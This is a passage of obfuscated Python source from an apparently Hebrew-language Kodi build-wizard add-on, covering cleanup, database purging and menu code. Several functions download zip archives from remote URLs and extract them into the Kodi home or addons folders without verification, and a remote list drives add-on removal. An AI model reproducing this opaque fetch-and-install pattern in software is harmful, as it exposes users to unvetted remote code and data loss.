				elif OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -2 ]=='userdata'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -1 ]=='addon_data'and 'plugin.video.PastebinPlay'in OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO ]and KEEPINFO =='true':wiz .log ("Keep Info: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4608
				elif OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -2 ]=='userdata'and OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO -1 ]=='addon_data'and 'plugin.video.playlistLoader'in OO0OO000OOOOOOOO0 [O00O0O0O0OOOO0OOO ]and KEEPPLAYLIST =='true':wiz .log ("Keep playlist: %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4609
				elif OOO0OO00OO0OOO0O0 in LOGFILES :wiz .log ("Keep Log File: %s"%OOO0OO00OO0OOO0O0 ,xbmc .LOGNOTICE )#line:4610
				elif OOO0OO00OO0OOO0O0 .endswith ('.db'):#line:4611
					try :#line:4612
						if OOO0OO00OO0OOO0O0 ==OO00OO0O000OOO00O and KODIV >=17 :wiz .log ("Ignoring %s on v%s"%(OOO0OO00OO0OOO0O0 ,KODIV ),xbmc .LOGNOTICE )#line:4613
						else :os .remove (os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ))#line:4614
					except Exception as O0OO0OOOOOO0000OO :#line:4615
						if not OOO0OO00OO0OOO0O0 .startswith ('Textures13'):#line:4616
							wiz .log ('Failed to delete, Purging DB',xbmc .LOGNOTICE )#line:4617
							wiz .log ("-> %s"%(str (O0OO0OOOOOO0000OO )),xbmc .LOGNOTICE )#line:4618
							wiz .purgeDb (os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ))#line:4619
				else :#line:4620
					DP .update (int (wiz .percentage (OO00OO000000OOOOO ,OO0000OO0O00O0000 )),'','[COLOR %s]File: [/COLOR][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OOO0OO00OO0OOO0O0 ),'')#line:4621
					try :os .remove (os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ))#line:4622
					except Exception as O0OO0OOOOOO0000OO :#line:4623
						wiz .log ("Error removing %s"%os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),xbmc .LOGNOTICE )#line:4624
						wiz .log ("-> / %s"%(str (O0OO0OOOOOO0000OO )),xbmc .LOGNOTICE )#line:4625
			if DP .iscanceled ():#line:4626
				DP .close ()#line:4627
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:4628
				return False #line:4629
		for O0OOO000O0OOOO0OO ,O0000OOO0OO0OOO0O ,O0OOOOO00000OOOO0 in os .walk (OOO0O0OO00000OO00 ,topdown =True ):#line:4630
			O0000OOO0OO0OOO0O [:]=[OO0OOO0OO00OOOO00 for OO0OOO0OO00OOOO00 in O0000OOO0OO0OOO0O if OO0OOO0OO00OOOO00 not in EXCLUDES ]#line:4631
			for OOO0OO00OO0OOO0O0 in O0000OOO0OO0OOO0O :#line:4632
			  DP .update (100 ,'','Cleaning Up Empty Folder: [COLOR %s]%s[/COLOR]'%(COLOR1 ,OOO0OO00OO0OOO0O0 ),'')#line:4633
			  if OOO0OO00OO0OOO0O0 not in ["Database","userdata","temp","addons","addon_data"]:#line:4634
			   if not (OOO0OO00OO0OOO0O0 =='script.skinshortcuts'and KEEPSKIN =='true'):#line:4635
			    if not (OOO0OO00OO0OOO0O0 =='skin.titan'and KEEPSKIN3 =='true'):#line:4637
			      if not (OOO0OO00OO0OOO0O0 =='pvr.iptvsimple'and KEEPPVR =='true'):#line:4638
			       if not (OOO0OO00OO0OOO0O0 =='plugin.video.metalliq'and KEEPMOVIELIST =='true'):#line:4639
			        if not (OOO0OO00OO0OOO0O0 =='plugin.video.sdarot.tv'and KEEPINFO =='true'):#line:4640
			         if not (OOO0OO00OO0OOO0O0 =='program.apollo'and KEEPINFO =='true'):#line:4641
			          if not (OOO0OO00OO0OOO0O0 =='script.skinshortcuts'and KEEPHUBMOVIE =='true'):#line:4642
			            if not (OOO0OO00OO0OOO0O0 =='plugin.video.playlistLoader'and KEEPPLAYLIST =='true'):#line:4644
			             if not (OOO0OO00OO0OOO0O0 =='script.skinshortcuts'and KEEPHUBTVSHOW =='true'):#line:4645
			              if not (OOO0OO00OO0OOO0O0 =='script.skinshortcuts'and KEEPHUBTV =='true'):#line:4646
			               if not (OOO0OO00OO0OOO0O0 =='script.skinshortcuts'and KEEPHUBVOD =='true'):#line:4647
			                if not (OOO0OO00OO0OOO0O0 =='script.skinshortcuts'and KEEPHUBKIDS =='true'):#line:4648
			                 if not (OOO0OO00OO0OOO0O0 =='script.skinshortcuts'and KEEPHUBMUSIC =='true'):#line:4649
			                  if not (OOO0OO00OO0OOO0O0 =='plugin.video.neptune'and KEEPINFO =='true'):#line:4650
			                   if not (OOO0OO00OO0OOO0O0 =='plugin.video.youtube'and KEEPINFO =='true'):#line:4651
			                    if not (OOO0OO00OO0OOO0O0 =='service.subtitles.subscenter'and KEEPINFO =='true'):#line:4652
			                     if not (OOO0OO00OO0OOO0O0 =='script.skinshortcuts'and KEEPHUBMENU =='true'):#line:4653
			                       if not (OOO0OO00OO0OOO0O0 =='service.subtitles.All_Subs'and KEEPINFO =='true'):#line:4655
			                           if not (OOO0OO00OO0OOO0O0 =='plugin.audio.soundcloud'and KEEPINFO =='true'):#line:4659
			                            if not (OOO0OO00OO0OOO0O0 =='plugin.video.kodipopcorntime'and KEEPINFO =='true'):#line:4660
			                             if not (OOO0OO00OO0OOO0O0 =='plugin.video.torrenter'and KEEPINFO =='true'):#line:4661
			                              if not (OOO0OO00OO0OOO0O0 =='plugin.video.quasar'and KEEPINFO =='true'):#line:4662
			                               if not (OOO0OO00OO0OOO0O0 =='script.skinshortcuts'and KEEPTVLIST =='true'):#line:4663
			                                  shutil .rmtree (os .path .join (O0OOO000O0OOOO0OO ,OOO0OO00OO0OOO0O0 ),ignore_errors =True ,onerror =None )#line:4665
			if DP .iscanceled ():#line:4666
				DP .close ()#line:4667
				wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]התקנה נקיה מבוטלת[/COLOR]"%COLOR2 )#line:4668
				return False #line:4669
		DP .close ()#line:4670
		wiz .clearS ('build')#line:4671
		if over ==True :#line:4672
			return True #line:4673
		elif install =='restore':#line:4674
			return True #line:4675
		elif install :#line:4676
			buildWizard (install ,'normal',over =True )#line:4677
		else :#line:4678
			if INSTALLMETHOD ==1 :O00000OOOO00O000O =1 #line:4679
			elif INSTALLMETHOD ==2 :O00000OOOO00O000O =0 #line:4680
			else :O00000OOOO00O000O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצגת נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR red]הצגת נתונים[/COLOR][/B]",nolabel ="[B][COLOR green]סגירה[/COLOR][/B]")#line:4681
			if O00000OOOO00O000O ==1 :wiz .reloadFix ('fresh')#line:4682
			else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:4683
	else :#line:4684
		if not install =='restore':#line:4685
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]התקנה נקיה: מבוטלת![/COLOR]'%COLOR2 )#line:4686
			wiz .refresh ()#line:4687
def clearCache ():#line:4692
		wiz .clearCache ()#line:4693
def fixwizard ():#line:4697
		wiz .fixwizard ()#line:4698
def totalClean ():#line:4700
		wiz .clearCache ()#line:4702
		wiz .clearPackages ('total')#line:4703
		clearThumb ('total')#line:4704
		cleanfornewbuild ()#line:4705
def cleanfornewbuild ():#line:4706
		try :#line:4707
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.xml"))#line:4708
		except :#line:4709
			pass #line:4710
		try :#line:4711
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.idanplus","epg.json"))#line:4712
		except :#line:4713
			pass #line:4714
		try :#line:4715
			os .remove (os .path .join (xbmc .translatePath ("special://userdata/"),"addon_data","plugin.video.TheFirstAvenger","localfile.txt"))#line:4716
		except :#line:4717
			pass #line:4718
def clearThumb (type =None ):#line:4719
	O00OOO0OO0OOO0O0O =wiz .latestDB ('Textures')#line:4720
	if not type ==None :O0O0O00O000OOO0O0 =1 #line:4721
	else :O0O0O00O000OOO0O0 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to delete the %s and Thumbnails folder?'%(COLOR2 ,O00OOO0OO0OOO0O0O ),"They will repopulate on the next startup[/COLOR]",nolabel ='[B][COLOR red]Don\'t Delete[/COLOR][/B]',yeslabel ='[B][COLOR green]Delete Thumbs[/COLOR][/B]')#line:4722
	if O0O0O00O000OOO0O0 ==1 :#line:4723
		try :wiz .removeFile (os .join (DATABASE ,O00OOO0OO0OOO0O0O ))#line:4724
		except :wiz .log ('Failed to delete, Purging DB.');wiz .purgeDb (O00OOO0OO0OOO0O0O )#line:4725
		wiz .removeFolder (THUMBS )#line:4726
	else :wiz .log ('Clear thumbnames cancelled')#line:4728
	wiz .redoThumbs ()#line:4729
def purgeDb ():#line:4731
	O00OOO0O00OO00000 =[];O000OOOOO0OOO000O =[]#line:4732
	for O0O0O0O00OOOO0O00 ,O00000OO0OO0OO000 ,OO00O0O0O00OO0O0O in os .walk (HOME ):#line:4733
		for OOO000OOO00OOOOO0 in fnmatch .filter (OO00O0O0O00OO0O0O ,'*.db'):#line:4734
			if OOO000OOO00OOOOO0 !='Thumbs.db':#line:4735
				OOOOO00O000OO0000 =os .path .join (O0O0O0O00OOOO0O00 ,OOO000OOO00OOOOO0 )#line:4736
				O00OOO0O00OO00000 .append (OOOOO00O000OO0000 )#line:4737
				OOOOOOOOO000OOOOO =OOOOO00O000OO0000 .replace ('\\','/').split ('/')#line:4738
				O000OOOOO0OOO000O .append ('(%s) %s'%(OOOOOOOOO000OOOOO [len (OOOOOOOOO000OOOOO )-2 ],OOOOOOOOO000OOOOO [len (OOOOOOOOO000OOOOO )-1 ]))#line:4739
	if KODIV >=16 :#line:4740
		O00OO0O00O0OO0OO0 =DIALOG .multiselect ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O000OOOOO0OOO000O )#line:4741
		if O00OO0O00O0OO0OO0 ==None :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4742
		elif len (O00OO0O00O0OO0OO0 )==0 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4743
		else :#line:4744
			for OO0O00OOO00OOOOOO in O00OO0O00O0OO0OO0 :wiz .purgeDb (O00OOO0O00OO00000 [OO0O00OOO00OOOOOO ])#line:4745
	else :#line:4746
		O00OO0O00O0OO0OO0 =DIALOG .select ("[COLOR %s]Select DB File to Purge[/COLOR]"%COLOR2 ,O000OOOOO0OOO000O )#line:4747
		if O00OO0O00O0OO0OO0 ==-1 :wiz .LogNotify ("[COLOR %s]Purge Database[/COLOR]"%COLOR1 ,"[COLOR %s]Cancelled[/COLOR]"%COLOR2 )#line:4748
		else :wiz .purgeDb (O00OOO0O00OO00000 [OO0O00OOO00OOOOOO ])#line:4749
def fastupdatefirstbuild (O0OO00OOO0OOO000O ):#line:4755
	xbmc .executebuiltin ((u'Notification(%s,%s)'%('Kodi Anonymous','בודק אם קיים עדכון בשבילך')))#line:4756
	if ENABLE =='Yes':#line:4757
		if not NOTIFY =='true':#line:4758
			O0O0OO0O0O00O00OO =wiz .workingURL (NOTIFICATION )#line:4759
			if O0O0OO0O0O00O00OO ==True :#line:4760
				OOOO0OO0O0OOO0O0O ,OO0OO0OO0OO0OO0O0 =wiz .splitNotify (NOTIFICATION )#line:4761
				if not OOOO0OO0O0OOO0O0O ==False :#line:4763
					try :#line:4764
						OOOO0OO0O0OOO0O0O =int (OOOO0OO0O0OOO0O0O );O0OO00OOO0OOO000O =int (O0OO00OOO0OOO000O )#line:4765
						checkidupdate ()#line:4766
						wiz .setS ("notedismiss","true")#line:4767
						if OOOO0OO0O0OOO0O0O ==O0OO00OOO0OOO000O :#line:4768
							wiz .log ("[Notifications] id[%s] Dismissed"%int (OOOO0OO0O0OOO0O0O ),xbmc .LOGNOTICE )#line:4769
						elif OOOO0OO0O0OOO0O0O >O0OO00OOO0OOO000O :#line:4771
							wiz .log ("[Notifications] id: %s"%str (OOOO0OO0O0OOO0O0O ),xbmc .LOGNOTICE )#line:4772
							wiz .setS ('noteid',str (OOOO0OO0O0OOO0O0O ))#line:4773
							wiz .setS ("notedismiss","true")#line:4774
							wiz .log ("[Notifications] Complete",xbmc .LOGNOTICE )#line:4777
					except Exception as OOO000OO00000OOOO :#line:4778
						wiz .log ("Error on Notifications Window: %s"%str (OOO000OO00000OOOO ),xbmc .LOGERROR )#line:4779
				else :wiz .log ("[Notifications] Text File not formated Correctly")#line:4781
			else :wiz .log ("[Notifications] URL(%s): %s"%(NOTIFICATION ,O0O0OO0O0O00O00OO ),xbmc .LOGNOTICE )#line:4782
		else :wiz .log ("[Notifications] Turned Off",xbmc .LOGNOTICE )#line:4783
	else :wiz .log ("[Notifications] Not Enabled",xbmc .LOGNOTICE )#line:4784
def checkidupdate ():#line:4790
				wiz .setS ("notedismiss","true")#line:4792
				O0OOO0O000OOOO0O0 =wiz .workingURL (NOTIFICATION )#line:4793
				O0OOO000O000O000O =" Kodi Premium"#line:4795
				O0O0O0OO00O00OO0O =wiz .checkBuild (O0OOO000O000O000O ,'gui')#line:4796
				OOOOOO00OO00OO00O =O0OOO000O000O000O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:4797
				if not wiz .workingURL (O0O0O0OO00O00OO0O )==True :return #line:4798
				if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4799
				DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד עדכון מהיר אוטומטי:[/B][/COLOR][COLOR %s][/COLOR]'%(COLOR1 ,O0OOO000O000O000O ),'','אנא המתן')#line:4800
				OO000O000000OOOO0 =os .path .join (PACKAGES ,'%s_guisettings.zip'%OOOOOO00OO00OO00O )#line:4801
				try :os .remove (OO000O000000OOOO0 )#line:4802
				except :pass #line:4803
				logging .warning (O0O0O0OO00O00OO0O )#line:4804
				if 'google'in O0O0O0OO00O00OO0O :#line:4805
				   OO0O000OOOOOO00O0 =googledrive_download (O0O0O0OO00O00OO0O ,OO000O000000OOOO0 ,DP ,wiz .checkBuild (O0OOO000O000O000O ,'filesize'))#line:4806
				else :#line:4809
				  downloader .download (O0O0O0OO00O00OO0O ,OO000O000000OOOO0 ,DP )#line:4810
				xbmc .sleep (100 )#line:4811
				OO000OOO0O00O0O0O ='[COLOR %s][B]מתקין:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O0OOO000O000O000O )#line:4812
				DP .update (0 ,OO000OOO0O00O0O0O ,'','אנא המתן')#line:4813
				extract .all (OO000O000000OOOO0 ,HOME ,DP ,title =OO000OOO0O00O0O0O )#line:4814
				DP .close ()#line:4815
				wiz .defaultSkin ()#line:4816
				wiz .lookandFeelData ('save')#line:4817
				if INSTALLMETHOD ==1 :O0000OOO0O0OOOOOO =1 #line:4820
				elif INSTALLMETHOD ==2 :O0000OOO0O0OOOOOO =0 #line:4821
				else :DP .close ()#line:4822
def gaiaserenaddon ():#line:4824
  OO0O0000OOOOO000O =(ADDON .getSetting ("gaiaseren"))#line:4825
  O0O00O00O0O0OOO00 =(ADDON .getSetting ("rdbuild"))#line:4826
  if OO0O0000OOOOO000O =='true'and O0O00O00O0O0OOO00 =='true':#line:4827
    O0OOOO0OOOO0O0O0O =(NEWFASTUPDATE )#line:4828
    O00OO000000O0000O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:4829
    O0O0O0OOOOOO0000O =xbmcgui .DialogProgress ()#line:4830
    O0O0O0OOOOOO0000O .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]" '','אנא המתן')#line:4831
    O000O00O0O0000O0O =os .path .join (PACKAGES ,'isr.zip')#line:4832
    OO0O0O000OOO0OOO0 =urllib2 .Request (O0OOOO0OOOO0O0O0O )#line:4833
    OO00000O0O000OOO0 =urllib2 .urlopen (OO0O0O000OOO0OOO0 )#line:4834
    OOO00OO0OO000OO00 =xbmcgui .DialogProgress ()#line:4836
    OOO00OO0OO000OO00 .create ("[B][COLOR=green]מתקין את ההרחבה גאיה[/COLOR][/B]","[B][COLOR=yellow]מוריד....[/COLOR][/B]")#line:4837
    OOO00OO0OO000OO00 .update (0 )#line:4838
    OOOOOO0O000OO0000 =open (O000O00O0O0000O0O ,'wb')#line:4840
    try :#line:4842
      OOOO0O0O0OOO0O0OO =OO00000O0O000OOO0 .info ().getheader ('Content-Length').strip ()#line:4843
      OOOO000O00OO0OOO0 =True #line:4844
    except AttributeError :#line:4845
          OOOO000O00OO0OOO0 =False #line:4846
    if OOOO000O00OO0OOO0 :#line:4848
          OOOO0O0O0OOO0O0OO =int (OOOO0O0O0OOO0O0OO )#line:4849
    O00O0O00O0O0000OO =0 #line:4851
    O0OO00OOO0000OO0O =time .time ()#line:4852
    while True :#line:4853
          O0O00OO0OOOO00OO0 =OO00000O0O000OOO0 .read (8192 )#line:4854
          if not O0O00OO0OOOO00OO0 :#line:4855
              sys .stdout .write ('\n')#line:4856
              break #line:4857
          O00O0O00O0O0000OO +=len (O0O00OO0OOOO00OO0 )#line:4859
          OOOOOO0O000OO0000 .write (O0O00OO0OOOO00OO0 )#line:4860
          if not OOOO000O00OO0OOO0 :#line:4862
              OOOO0O0O0OOO0O0OO =O00O0O00O0O0000OO #line:4863
          if OOO00OO0OO000OO00 .iscanceled ():#line:4864
             OOO00OO0OO000OO00 .close ()#line:4865
             try :#line:4866
              os .remove (O000O00O0O0000O0O )#line:4867
             except :#line:4868
              pass #line:4869
             break #line:4870
          O00OO0OO00OO0OO00 =float (O00O0O00O0O0000OO )/OOOO0O0O0OOO0O0OO #line:4871
          O00OO0OO00OO0OO00 =round (O00OO0OO00OO0OO00 *100 ,2 )#line:4872
          OOO0OO0OO00O00O0O =O00O0O00O0O0000OO /(1024 *1024 )#line:4873
          OO0O0OO000OO000O0 =OOOO0O0O0OOO0O0OO /(1024 *1024 )#line:4874
          O0O000OOO0OO00000 ='[COLOR %s][B]Size:[/B] [COLOR %s]%.02f[/COLOR] MB of [COLOR %s]%.02f[/COLOR] MB[/COLOR]'%('teal','skyblue',OOO0OO0OO00O00O0O ,'teal',OO0O0OO000OO000O0 )#line:4875
          if (time .time ()-O0OO00OOO0000OO0O )>0 :#line:4876
            OOO0O00O0OOO00OOO =O00O0O00O0O0000OO /(time .time ()-O0OO00OOO0000OO0O )#line:4877
            OOO0O00O0OOO00OOO =OOO0O00O0OOO00OOO /1024 #line:4878
          else :#line:4879
           OOO0O00O0OOO00OOO =0 #line:4880
          O0O0OOO0OOOO0OO0O ='KB'#line:4881
          if OOO0O00O0OOO00OOO >=1024 :#line:4882
             OOO0O00O0OOO00OOO =OOO0O00O0OOO00OOO /1024 #line:4883
             O0O0OOO0OOOO0OO0O ='MB'#line:4884
          if OOO0O00O0OOO00OOO >0 and not O00OO0OO00OO0OO00 ==100 :#line:4885
              OO0O000OO0000O00O =(OOOO0O0O0OOO0O0OO -O00O0O00O0O0000OO )/OOO0O00O0OOO00OOO #line:4886
          else :#line:4887
              OO0O000OO0000O00O =0 #line:4888
          OOOOO0OO0OOOOO0O0 ='[COLOR %s][B]Speed:[/B] [COLOR %s]%.02f [/COLOR]%s/s '%('teal','skyblue',OOO0O00O0OOO00OOO ,O0O0OOO0OOOO0OO0O )#line:4889
          OOO00OO0OO000OO00 .update (int (O00OO0OO00OO0OO00 ),O0O000OOO0OO00000 ,OOOOO0OO0OOOOO0O0 +"[B][COLOR=yellow]מוריד.... [/COLOR][/B]")#line:4891
    O00OOO0O00OO0O0O0 =xbmc .translatePath (os .path .join ('special://home/addons'))#line:4894
    OOOOOO0O000OO0000 .close ()#line:4897
    extract .all (O000O00O0O0000O0O ,O00OOO0O00OO0O0O0 ,OOO00OO0OO000OO00 )#line:4898
    try :#line:4902
      os .remove (O000O00O0O0000O0O )#line:4903
    except :#line:4904
      pass #line:4905
def testnotify ():#line:4907
	OOOO00000O0000O0O =wiz .workingURL (NOTIFICATION )#line:4908
	if OOOO00000O0000O0O ==True :#line:4909
		try :#line:4910
			OO00O00O00O00OOO0 ,O00O0O0O000O0O0O0 =wiz .splitNotify (NOTIFICATION )#line:4911
			if OO00O00O00O00OOO0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:4912
			if STARTP2 ()=='ok':#line:4913
				notify .notification (O00O0O0O000O0O0O0 ,True )#line:4914
		except Exception as O0O0OO00O000000O0 :#line:4915
			wiz .log ("Error on Notifications Window: %s"%str (O0O0OO00O000000O0 ),xbmc .LOGERROR )#line:4916
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:4917
def testnotify2 ():#line:4918
	O00O000O000O000O0 =wiz .workingURL (NOTIFICATION2 )#line:4919
	if O00O000O000O000O0 ==True :#line:4920
		try :#line:4921
			OO0O00O00O0OOOOOO ,OO0O00000OOO0O0O0 =wiz .splitNotify (NOTIFICATION2 )#line:4922
			if OO0O00O00O0OOOOOO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:4923
			if STARTP2 ()=='ok':#line:4924
				notify .notification2 (OO0O00000OOO0O0O0 ,True )#line:4925
		except Exception as O0000O0O00O000OO0 :#line:4926
			wiz .log ("Error on Notifications Window: %s"%str (O0000O0O00O000OO0 ),xbmc .LOGERROR )#line:4927
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:4928
def testnotify3 ():#line:4929
	O0O0OO0000OOO0O0O =wiz .workingURL (NOTIFICATION3 )#line:4930
	if O0O0OO0000OOO0O0O ==True :#line:4931
		try :#line:4932
			O0O0O0000OO00O0OO ,O000O0O00OOOO0O0O =wiz .splitNotify (NOTIFICATION3 )#line:4933
			if O0O0O0000OO00O0OO ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:4934
			if STARTP2 ()=='ok':#line:4935
				notify .notification3 (O000O0O00OOOO0O0O ,True )#line:4936
		except Exception as O00OOO0O0O0O0OO0O :#line:4937
			wiz .log ("Error on Notifications Window: %s"%str (O00OOO0O0O0O0OO0O ),xbmc .LOGERROR )#line:4938
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:4939
def servicemanual ():#line:4940
	OOO0O0O00O0OOOO00 =wiz .workingURL (HELPINFO )#line:4941
	if OOO0O0O00O0OOOO00 ==True :#line:4942
		try :#line:4943
			OO0000O0O0O0OOO00 ,O0O0OOO00O0OOO0OO =wiz .splitNotify (HELPINFO )#line:4944
			if OO0000O0O0O0OOO00 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:4945
			notify .helpinfo (O0O0OOO00O0OOO0OO ,True )#line:4946
		except Exception as OO0000OO00OOOO0OO :#line:4947
			wiz .log ("Error on Notifications Window: %s"%str (OO0000OO00OOOO0OO ),xbmc .LOGERROR )#line:4948
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:4949
def testupdate ():#line:4951
	if BUILDNAME =="":#line:4952
		notify .updateWindow ()#line:4953
	else :#line:4954
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:4955
def testfirst ():#line:4957
	notify .firstRun ()#line:4958
def testfirstRun ():#line:4960
	notify .firstRunSettings ()#line:4961
def fastinstall ():#line:4964
	notify .firstRuninstall ()#line:4965
def addDir (O0O0O0O00000O000O ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:4972
	O0O000OO00O0000OO =sys .argv [0 ]#line:4973
	if not mode ==None :O0O000OO00O0000OO +="?mode=%s"%urllib .quote_plus (mode )#line:4974
	if not name ==None :O0O000OO00O0000OO +="&name="+urllib .quote_plus (name )#line:4975
	if not url ==None :O0O000OO00O0000OO +="&url="+urllib .quote_plus (url )#line:4976
	OOOO0OO00OO0O0O00 =True #line:4977
	if themeit :O0O0O0O00000O000O =themeit %O0O0O0O00000O000O #line:4978
	O0O0000OOO000O0OO =xbmcgui .ListItem (O0O0O0O00000O000O ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:4979
	O0O0000OOO000O0OO .setInfo (type ="Video",infoLabels ={"Title":O0O0O0O00000O000O ,"Plot":description })#line:4980
	O0O0000OOO000O0OO .setProperty ("Fanart_Image",fanart )#line:4981
	if not menu ==None :O0O0000OOO000O0OO .addContextMenuItems (menu ,replaceItems =overwrite )#line:4982
	OOOO0OO00OO0O0O00 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =O0O000OO00O0000OO ,listitem =O0O0000OOO000O0OO ,isFolder =True )#line:4983
	return OOOO0OO00OO0O0O00 #line:4984
def addFile (O00O00O00OOO0OOO0 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:4986
	OOO0OOO0OO0O0OO0O =sys .argv [0 ]#line:4987
	if not mode ==None :OOO0OOO0OO0O0OO0O +="?mode=%s"%urllib .quote_plus (mode )#line:4988
	if not name ==None :OOO0OOO0OO0O0OO0O +="&name="+urllib .quote_plus (name )#line:4989
	if not url ==None :OOO0OOO0OO0O0OO0O +="&url="+urllib .quote_plus (url )#line:4990
	OOOO00OO00O0O000O =True #line:4991
	if themeit :O00O00O00OOO0OOO0 =themeit %O00O00O00OOO0OOO0 #line:4992
	O00O0OO00OO00O0OO =xbmcgui .ListItem (O00O00O00OOO0OOO0 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:4993
	O00O0OO00OO00O0OO .setInfo (type ="Video",infoLabels ={"Title":O00O00O00OOO0OOO0 ,"Plot":description })#line:4994
	O00O0OO00OO00O0OO .setProperty ("Fanart_Image",fanart )#line:4995
	if not menu ==None :O00O0OO00OO00O0OO .addContextMenuItems (menu ,replaceItems =overwrite )#line:4996
	OOOO00OO00O0O000O =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OOO0OOO0OO0O0OO0O ,listitem =O00O0OO00OO00O0OO ,isFolder =False )#line:4997
	return OOOO00OO00O0O000O #line:4998
def get_params ():#line:5000
	OOO0O0O0000O0OO0O =[]#line:5001
	O00OOOOO0O0OO0O0O =sys .argv [2 ]#line:5002
	if len (O00OOOOO0O0OO0O0O )>=2 :#line:5003
		O0000O0O000OOOOOO =sys .argv [2 ]#line:5004
		OOOOOOOO00OO0OO00 =O0000O0O000OOOOOO .replace ('?','')#line:5005
		if (O0000O0O000OOOOOO [len (O0000O0O000OOOOOO )-1 ]=='/'):#line:5006
			O0000O0O000OOOOOO =O0000O0O000OOOOOO [0 :len (O0000O0O000OOOOOO )-2 ]#line:5007
		O0OOO0000OOO0O000 =OOOOOOOO00OO0OO00 .split ('&')#line:5008
		OOO0O0O0000O0OO0O ={}#line:5009
		for O0OOO0O0O0OO00OOO in range (len (O0OOO0000OOO0O000 )):#line:5010
			O0O00O000O00OO000 ={}#line:5011
			O0O00O000O00OO000 =O0OOO0000OOO0O000 [O0OOO0O0O0OO00OOO ].split ('=')#line:5012
			if (len (O0O00O000O00OO000 ))==2 :#line:5013
				OOO0O0O0000O0OO0O [O0O00O000O00OO000 [0 ]]=O0O00O000O00OO000 [1 ]#line:5014
		return OOO0O0O0000O0OO0O #line:5016
def remove_addons ():#line:5018
	try :#line:5019
			import json #line:5020
			OO0O0O0OO0000OO00 =urllib2 .urlopen (remove_url ).readlines ()#line:5021
			for OO000O000OOOOOO00 in OO0O0O0OO0000OO00 :#line:5022
				OOOO000O0OOOOOOOO =OO000O000OOOOOO00 .split (':')[1 ].strip ()#line:5024
